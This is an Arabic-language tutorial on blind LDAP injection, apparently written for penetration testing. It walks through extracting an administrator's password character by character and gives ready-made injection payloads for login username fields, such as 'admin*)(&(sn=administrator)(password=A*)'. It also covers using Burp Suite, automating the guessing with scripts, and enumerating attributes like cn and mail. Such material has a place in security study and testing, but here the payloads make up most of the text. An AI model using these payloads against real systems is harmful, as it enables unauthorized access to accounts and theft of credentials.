
## الخطوات العملية للاستغلال الأعمى
1. **إعداد البيئة**:
   - استخدم متصفحًا مع أداة وكيل (مثل **Burp Suite** أو **OWASP ZAP**) لمراقبة وتعديل الطلبات.
   - حدد حقل إدخال يتفاعل مع LDAP (مثل حقل اسم المستخدم في نموذج تسجيل الدخول أو حقل البحث).
2. **اختبار استعلام عام**:
   - ابدأ باستعلام واسع للتأكد من أن الخاصية موجودة (مثل `password=*`).
   - مثال: أدخل `(&(sn=administrator)(password=*))` وتحقق من الاستجابة.
3. **اختبار الأحرف تدريجيًا**:
   - اختبر الأحرف واحدًا تلو الآخر (مثل `password=A*`, `password=B*`, ...) لتحديد الحرف الأول.
   - بمجرد العثور على حرف صحيح (مثل `M*`), اختبر الأحرف التالية (مثل `MA*`, `MB*`, ...).
4. **مراقبة الاستجابات**:
   - حدد كيف يُظهر التطبيق الفرق بين **True** (OK) و**False** (KO). على سبيل المثال:
     - **OK**: صفحة تحتوي على نص معين (مثل "Welcome")، رمز حالة 200، أو طول استجابة مختلف.
     - **KO**: خطأ (مثل "Invalid credentials")، رمز حالة 403، أو صفحة فارغة.
5. **أتمتة العملية (اختياري)**:
   - إذا كان الاختبار اليدوي بطيئًا، استخدم سكربت لأتمتة إرسال الطلبات وتحليل الاستجابات.

---

## جميع المحاولات الممكنة للاستغلال الأعمى
في الاستغلال الأعمى، المحاولات تعتمد على بناء استعلامات LDAP لاختبار قيم تدريجية لخاصية معينة (مثل `password`, `cn`, `mail`). سأقسم المحاولات إلى فئتين:
1. **استعلامات يدوية**: للاختبار اليدوي باستخدام Burp Suite أو نموذج الإدخال.
2. **استعلامات للأتمتة**: للاستخدام مع سكربتات.

### 1. الاستعلامات اليدوية
تُستخدم هذه الاستعلامات عند اختبار الثغرة يدويًا عبر حقل إدخال (مثل اسم المستخدم أو البحث) أو باستخدام Burp Suite Repeater. الهدف هو تخمين قيمة خاصية (مثل كلمة المرور) حرفًا بحرفًا.

#### أ. اختبار وجود الخاصية
- **الاستعلام**: `(&(sn=administrator)(password=*))`
- **الإدخال**:
  - اسم المستخدم: `admin*)(&(sn=administrator)(password=*)`
  - كلمة المرور: `anything`
- **كيف يعمل**:
  - يتحقق مما إذا كانت خاصية `password` موجودة لمستخدم `administrator`.
  - الاستعلام الناتج: `(&(uid=admin*)(&(sn=administrator)(password=*))(userPassword=anything))`
  - إذا كانت الاستجابة **OK** (مثل صفحة مختلفة أو نص معين)، فالخاصية موجودة.
- **متى يُستخدم؟**:
  - كخطوة أولية للتأكد من أن الخاصية (مثل `password`) يمكن استهدافها.

#### ب. اختبار الحرف الأول
- **الاستعلامات**:
  - `(&(sn=administrator)(password=A*))`
  - `(&(sn=administrator)(password=B*))`
  - `(&(sn=administrator)(password=C*))`
  - ... (كرر لجميع الأحرف: A-Z, a-z, 0-9, ورموز مثل `_`, `@`, ...)
- **الإدخال**:
  - اسم المستخدم: `admin*)(&(sn=administrator)(password=A*)`
  - كلمة المرور: `anything`
- **كيف يعمل**:
  - يختبر ما إذا كانت كلمة المرور تبدأ بحرف معين (مثل `A`, `B`, ...).
  - إذا كانت الاستجابة **OK** لـ `M*` (مثل صفحة تحتوي على نص "Welcome")، فالحرف الأول هو `M`.
- **متى يُستخدم؟**:
  - لتحديد الحرف الأول من القيمة المستهدفة.

#### ج. اختبار الأحرف التالية
- **الاستعلامات** (بافتراض أن الحرف الأول هو `M`):
  - `(&(sn=administrator)(password=MA*))`
  - `(&(sn=administrator)(password=MB*))`
  - `(&(sn=administrator)(password=MC*))`
  - ... (كرر لجميع الأحرف)
- **الإدخال**:
  - اسم المستخدم: `admin*)(&(sn=administrator)(password=MA*)`
  - كلمة المرور: `anything`
- **كيف يعمل**:
  - يختبر الحرف الثاني بعد تأكيد الحرف الأول.
  - إذا كانت الاستجابة **OK** لـ `MY*`， فالحرف الثاني هو `Y`.
- **متى يُستخدم؟**:
  - لتخمين الأحرف التالية بعد تحديد الحرف الأول.

#### د. اختبار القيمة الكاملة
- **الاستعلامات** (بافتراض أنك وصلت إلى `MYK`):
  - `(&(sn=administrator)(password=MYKA*))`
  - `(&(sn=administrator)(password=MYKB*))`
  - ... (حتى تصل إلى القيمة الكاملة، مثل `MYKE`)
- **الإدخال**:
  - اسم المستخدم: `admin*)(&(sn=administrator)(password=MYKE))`
  - كلمة المرور: `anything`
- **كيف يعمل**:
  - يتحقق مما إذا كانت القيمة الكاملة صحيحة.
  - إذا كانت الاستجابة **OK** لـ `MYKE`، فهذه هي كلمة المرور.
- **متى يُستخدم؟**:
  - لتأكيد القيمة النهائية بعد تخمين الأحرف.

#### هـ. اختبار خصائص أخرى
- **الاستعلامات**:
  - `(&(sn=administrator)(cn=*))`
  - `(&(sn=administrator)(cn=A*))`
  - `(&(sn=administrator)(mail=*))`
  - `(&(sn=administrator)(mail=A*))`
- **الإدخال**:
  - اسم المستخدم: `admin*)(&(sn=administrator)(cn=A*)`
  - كلمة المرور: `anything`
- **كيف يعمل**:
  - يستهدف خصائص أخرى غير `password` (مثل `cn`, `mail`, `givenName`).
  - يتبع نفس المنطق: اختبار الأحرف تدريجيًا.
